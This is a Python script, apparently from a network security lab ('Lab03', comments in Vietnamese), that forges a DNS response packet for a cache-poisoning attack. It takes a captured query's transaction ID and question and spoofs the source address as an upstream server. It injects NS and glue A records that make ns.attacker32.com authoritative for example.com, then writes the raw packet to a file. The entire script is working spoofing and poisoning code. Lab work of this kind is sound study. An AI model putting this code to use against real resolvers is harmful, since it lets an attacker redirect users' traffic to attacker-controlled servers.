#!/usr/bin/env python3
"""Tao DNS Response gia mao tu ip_req.bin cho Lab03."""
import os
import random
import socket
import struct


def checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    total = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return ~total & 0xFFFF


def encode_name(name: str) -> bytes:
    out = b""
    for label in name.rstrip(".").split("."):
        out += bytes([len(label)]) + label.encode()
    return out + b"\x00"


def main() -> None:
    with open("ip_req.bin", "rb") as f:
        req = f.read()

    ihl = (req[0] & 0x0F) * 4
    dns_off = ihl + 8
    dns_id = struct.unpack("!H", req[dns_off:dns_off + 2])[0]

    # Lay nguyen question section (qname + qtype + qclass) tu query.
    p = dns_off + 12
    while req[p] != 0:
        p += 1 + req[p]
    q_end = p + 1 + 4
    question = req[dns_off + 12:q_end]

    root_ip = os.environ.get("ROOT_IP", "8.8.8.8")
    local_dns_ip = os.environ.get("LOCAL_DNS_IP", "10.11.1.20")
    attacker_ns_ip = os.environ.get("ATTACKER_NS_IP", "10.11.1.40")

    ns_owner = encode_name("example.com")
    ns_target = encode_name("ns.attacker32.com")
    ns_rr = ns_owner + struct.pack("!HHIH", 2, 1, 300, len(ns_target)) + ns_target
    a_rr = ns_target + struct.pack("!HHIH", 1, 1, 300, 4) + socket.inet_aton(attacker_ns_ip)

    dns = struct.pack("!HHHHHH", dns_id, 0x8180, 1, 0, 1, 1)
    dns += question + ns_rr + a_rr

    udp = struct.pack("!HHHH", 53, 44444, 8 + len(dns), 0)
    ip = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, 20 + len(udp), random.randint(0, 0xFFFF), 0, 64, 17, 0,
        socket.inet_aton(root_ip), socket.inet_aton(local_dns_ip),
    )
    ip = ip[:10] + struct.pack("!H", checksum(ip)) + ip[12:]
    packet = ip + udp + dns
    with open("ip_resp.bin", "wb") as f:
        f.write(packet)

    print("src=%s:53 dst=%s:44444 dns_id=%d ns=%s A=%s len=%d" % (
        root_ip, local_dns_ip, dns_id, "ns.attacker32.com", attacker_ns_ip, len(packet)))


if __name__ == "__main__":
    main()
